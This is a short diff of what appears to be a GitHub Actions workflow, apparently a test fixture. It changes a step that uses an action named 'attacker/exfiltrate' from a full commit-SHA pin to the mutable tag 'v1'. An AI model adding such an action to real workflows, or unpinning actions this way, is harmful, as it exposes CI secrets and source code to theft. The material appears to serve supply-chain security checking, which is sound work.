@@ -8,4 +8,4 @@ jobs:
     runs-on: ubuntu-24.04
     timeout-minutes: 10
     steps:
-      - uses: attacker/exfiltrate@0123456789abcdef0123456789abcdef01234567
+      - uses: attacker/exfiltrate@v1
